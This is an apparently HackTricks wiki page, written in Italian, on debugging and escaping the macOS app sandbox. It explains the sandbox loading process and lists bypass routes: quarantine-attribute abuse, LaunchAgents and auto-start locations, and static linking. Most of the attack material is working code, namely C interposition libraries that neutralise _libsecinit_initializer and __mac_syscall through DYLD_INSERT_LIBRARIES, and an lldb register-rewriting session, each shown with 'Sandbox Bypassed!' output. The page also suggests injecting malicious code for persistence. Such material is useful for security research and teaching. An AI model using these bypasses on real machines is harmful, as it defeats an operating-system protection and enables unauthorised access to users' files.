# macOS Sandbox Debug & Bypass

{{#include ../../../../../banners/hacktricks-training.md}}

## Processo di caricamento del Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Immagine da <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Nell'immagine precedente è possibile osservare **come il sandbox verrà caricato** quando viene eseguita un'applicazione con il diritto **`com.apple.security.app-sandbox`**.

Il compilatore collegherà `/usr/lib/libSystem.B.dylib` al binario.

Poi, **`libSystem.B`** chiamerà altre diverse funzioni fino a quando **`xpc_pipe_routine`** invia i diritti dell'app a **`securityd`**. Securityd controlla se il processo deve essere messo in quarantena all'interno del Sandbox, e se sì, verrà messo in quarantena.\
Infine, il sandbox verrà attivato con una chiamata a **`__sandbox_ms`** che chiamerà **`__mac_syscall`**.

## Possibili Bypass

### Bypass dell'attributo di quarantena

**I file creati da processi sandboxed** vengono aggiunti con l'**attributo di quarantena** per prevenire la fuga dal sandbox. Tuttavia, se riesci a **creare una cartella `.app` senza l'attributo di quarantena** all'interno di un'applicazione sandboxed, potresti far puntare il binario del bundle dell'app a **`/bin/bash`** e aggiungere alcune variabili d'ambiente nel **plist** per abusare di **`open`** per **lanciare la nuova app non sandboxed**.

Questo è ciò che è stato fatto in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

> [!CAUTION]
> Pertanto, al momento, se sei in grado di creare una cartella con un nome che termina in **`.app`** senza un attributo di quarantena, puoi sfuggire al sandbox perché macOS **controlla** solo l'**attributo di quarantena** nella **cartella `.app`** e nell'**eseguibile principale** (e faremo puntare l'eseguibile principale a **`/bin/bash`**).
>
> Nota che se un bundle .app è già stato autorizzato a essere eseguito (ha un xttr di quarantena con il flag autorizzato a eseguire attivato), potresti anche abusarne... tranne che ora non puoi scrivere all'interno dei bundle **`.app`** a meno che tu non abbia alcuni permessi TCC privilegiati (che non avrai all'interno di un sandbox elevato).

### Abuso della funzionalità Open

Negli [**ultimi esempi di bypass del sandbox di Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) si può apprezzare come la funzionalità cli **`open`** possa essere abusata per bypassare il sandbox.

{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Anche se un'applicazione è **destinata a essere sandboxed** (`com.apple.security.app-sandbox`), è possibile bypassare il sandbox se viene **eseguita da un LaunchAgent** (`~/Library/LaunchAgents`), per esempio.\
Come spiegato in [**questo post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), se vuoi ottenere persistenza con un'applicazione che è sandboxed, potresti farla eseguire automaticamente come un LaunchAgent e magari iniettare codice malevolo tramite variabili d'ambiente DyLib.

### Abuso delle posizioni di avvio automatico

Se un processo sandboxed può **scrivere** in un luogo dove **successivamente un'applicazione non sandboxed eseguirà il binario**, sarà in grado di **sfuggire semplicemente posizionando** lì il binario. Un buon esempio di questo tipo di posizioni sono `~/Library/LaunchAgents` o `/System/Library/LaunchDaemons`.

Per questo potresti anche aver bisogno di **2 passaggi**: far eseguire un processo con un **sandbox più permissivo** (`file-read*`, `file-write*`) che eseguirà il tuo codice che scriverà effettivamente in un luogo dove sarà **eseguito non sandboxed**.

Controlla questa pagina sulle **posizioni di avvio automatico**:

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abuso di altri processi

Se da quel processo sandbox sei in grado di **compromettere altri processi** in esecuzione in sandbox meno restrittive (o nessuna), sarai in grado di sfuggire ai loro sandbox:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Compilazione statica e collegamento dinamico

[**Questa ricerca**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) ha scoperto 2 modi per bypassare il Sandbox. Poiché il sandbox è applicato dal userland quando la libreria **libSystem** viene caricata. Se un binario potesse evitare di caricarlo, non verrebbe mai sandboxed:

- Se il binario fosse **completamente compilato staticamente**, potrebbe evitare di caricare quella libreria.
- Se il **binario non avesse bisogno di caricare alcuna libreria** (perché il linker è anche in libSystem), non avrà bisogno di caricare libSystem.

### Shellcodes

Nota che **anche gli shellcodes** in ARM64 devono essere collegati in `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Entitlements

Nota che anche se alcune **azioni** potrebbero essere **consentite dal sandbox** se un'applicazione ha un **entitlement** specifico, come in:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Per ulteriori informazioni su **Interposting** controlla:

{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interposta `_libsecinit_initializer` per prevenire il sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interporre `__mac_syscall` per prevenire il Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & bypass Sandbox with lldb

Compiliamo un'applicazione che dovrebbe essere sandboxed:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Quindi compila l'app:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> L'app cercherà di **leggere** il file **`~/Desktop/del.txt`**, che il **Sandbox non permetterà**.\
> Crea un file lì poiché una volta che il Sandbox è stato bypassato, sarà in grado di leggerlo:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Vediamo di fare il debug dell'applicazione per vedere quando viene caricato il Sandbox:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Anche con il Sandbox bypassato, TCC** chiederà all'utente se desidera consentire al processo di leggere file dal desktop

## Riferimenti

- [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
- [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

{{#include ../../../../../banners/hacktricks-training.md}}
